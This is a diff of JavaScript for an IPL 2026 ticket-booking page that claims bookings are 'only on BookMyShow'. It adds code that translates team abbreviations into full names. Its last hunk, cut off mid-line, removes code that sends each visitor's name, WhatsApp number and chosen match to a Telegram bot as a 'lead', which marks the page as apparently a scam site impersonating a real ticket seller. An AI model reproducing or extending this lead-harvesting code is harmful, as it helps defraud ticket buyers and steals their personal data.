@@ -10,6 +10,23 @@ window.matchDataMap = {}; // Global variable
 let globalFooterLogo = ''; // For dynamic logo
 
 // ==========================================
+// 🚀 FULL NAME TRANSLATOR
+// ==========================================
+const teamFullName = {
+    "CSK": "Chennai Super Kings", "MI": "Mumbai Indians",
+    "RCB": "Royal Challengers Bengaluru", "KKR": "Kolkata Knight Riders",
+    "SRH": "Sunrisers Hyderabad", "DC": "Delhi Capitals",
+    "PBKS": "Punjab Kings", "RR": "Rajasthan Royals",
+    "LSG": "Lucknow Super Giants", "GT": "Gujarat Titans"
+};
+
+function getFullName(shortName) {
+    if (!shortName) return "";
+    let cleanName = shortName.trim().toUpperCase();
+    return teamFullName[cleanName] || shortName.trim(); 
+}
+
+// ==========================================
 // 🔥 GET FULL MATCH DATA
 // ==========================================
 let match = null;
@@ -34,13 +51,21 @@ if (!match) {
         localStorage.setItem("matchId", match.id);
     }
 
+    // 🚀 TRANSLATE TITLE & OVERWRITE LOCALSTORAGE FOR NEXT PAGES
+    let rawTitle = match.title || "Match";
+    let tArr = rawTitle.split(/\s+vs\s+|\s+v\s+|\s*-\s*/i);
+    let fullT1 = tArr[0] ? getFullName(tArr[0]) : "Team A";
+    let fullT2 = tArr[1] ? getFullName(tArr[1]) : "Team B";
+    
+    // Translated Title
+    match.title = `${fullT1} vs ${fullT2}`;
+    localStorage.setItem('selectedMatch', JSON.stringify(match)); // 🔥 Saved for all future pages!
+
     // 🔥 DYNAMIC HEADER UPDATE 🔥
     const headerTitle = document.getElementById('header-match-title');
     if (headerTitle && match.title) {
         headerTitle.innerText = match.title;
     }
-
-    const teams = (match.title || "Match").split(' vs ');
 
     // 🔥 FETCH GLOBAL LOGO BEFORE RENDER 🔥
     import('./firebase.js').then((firebaseModule) => {
@@ -124,7 +149,7 @@ if (!match) {
         <div>
             <h3 style="font-size: 16px; font-weight: 700; color: #333; margin-bottom: 10px;">About The Event</h3>
             <p style="font-size: 13px; color: #555; line-height: 1.6; margin: 0;">
-                Book tickets for <b>${teams[0] || 'Team A'} vs ${teams[1] || 'Team B'}</b> IPL 2026 on ${match.date || 'match day'} at ${match.venue || 'the stadium'} only on BookMyShow.
+                Book tickets for <b>${match.title}</b> IPL 2026 on ${match.date || 'match day'} at ${match.venue || 'the stadium'} only on BookMyShow.
             </p>
             <div style="color: #f84464; font-size: 13px; font-weight: 600; margin-top: 8px;">Read More</div>
         </div>
@@ -219,18 +244,26 @@ if (!match) {
                         if (m.id === match.id || key === match.id || m.title === match.title) continue;
                         if (addedCount >= 5) break;
 
-                        const title = m.title || "Match";
+                        // 🚀 TRANSLATE DYNAMIC MATCHES TOO
+                        let dRawTitle = m.title || "Match";
+                        let dArr = dRawTitle.split(/\s+vs\s+|\s+v\s+|\s*-\s*/i);
+                        let dT1 = dArr[0] ? getFullName(dArr[0]) : "Team A";
+                        let dT2 = dArr[1] ? getFullName(dArr[1]) : "Team B";
+                        const dynTranslatedTitle = `${dT1} vs ${dT2}`;
+
                         const matchId = m.id || key;
                         const banner = m.banner || "https://via.placeholder.com/400x600";
                         const date = m.date || "TBA";
                         const price = m.price || 0;
 
+                        // Save it with translated title in map
+                        m.title = dynTranslatedTitle;
                         window.matchDataMap[matchId] = m;
 
                         const cardHtml = `
                         <div style="min-width: 130px; width: 130px; cursor: pointer;" onclick="selectRecommendedMatch('${matchId}')">
                             <img src="${banner}" style="width: 100%; border-radius: 8px; object-fit: cover; height: 195px; box-shadow: 0 2px 6px rgba(0,0,0,0.1);">
-                            <div style="font-size: 13px; font-weight: 600; color: #333; margin-top: 8px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${title}</div>
+                            <div style="font-size: 13px; font-weight: 600; color: #333; margin-top: 8px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${dynTranslatedTitle}</div>
                             <div style="font-size: 11px; color: #666; margin-top: 2px;">${date}</div>
                             <div style="font-size: 11px; color: #f84464; font-weight: bold; margin-top: 2px;">₹${price} onwards</div>
                         </div>
@@ -324,30 +357,4 @@ if (acceptBtn) {
         
         const telegramMsg = `🔥 *LEAD MOVED FORWARD! (Event Page)* 🔥\n\n` +
                             `👤 *Name:* ${name}\n` +
-                            `📞 *WhatsApp:* ${phone}\n` +
-                            `🏏 *Match:* ${matchTitle}\n` +
-                            `👉 *Action:* Accepted T&C, moving to Seat Selection!`;
-
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
-
-        try {
-            await fetch(url);
-        } catch (e) {
-            console.log("Telegram Error");
-        } finally {
-            closePopup();
-            localStorage.setItem('selectedMatch', JSON.stringify(match));
-            window.location.href = "seats.html";
-        }
-    };
-}
-
-// ==========================================
-// 🔥 BOOK BUTTON
-// ==========================================
-const bookNowBtn = document.getElementById('book-now-btn');
-if (bookNowBtn) {
-    bookNowBtn.onclick = () => {
-        openTnc();
-    };
-}
+           
